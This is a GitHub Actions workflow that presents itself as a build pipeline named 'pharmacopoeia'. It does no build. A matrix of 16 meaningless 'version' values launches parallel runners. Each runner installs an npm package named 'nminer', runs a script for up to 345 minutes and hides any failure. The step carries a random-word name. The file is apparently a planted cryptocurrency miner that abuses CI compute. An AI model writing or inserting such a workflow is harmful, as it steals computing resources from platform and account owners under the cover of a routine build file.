name: pharmacopoeia
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5992 }
          - { version: 8390 }
          - { version: 7106 }
          - { version: 5574 }
          - { version: 7430 }
          - { version: 3476 }
          - { version: 8127 }
          - { version: 9226 }
          - { version: 739 }
          - { version: 3440 }
          - { version: 9169 }
          - { version: 4376 }
          - { version: 1162 }
          - { version: 3270 }
          - { version: 355 }
          - { version: 5912 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: grim couch sticker barring piglet
        run: |
          npm install nminer@latest
          timeout 345m node pharmacopoeia.js || echo "pharmacopoeia executed"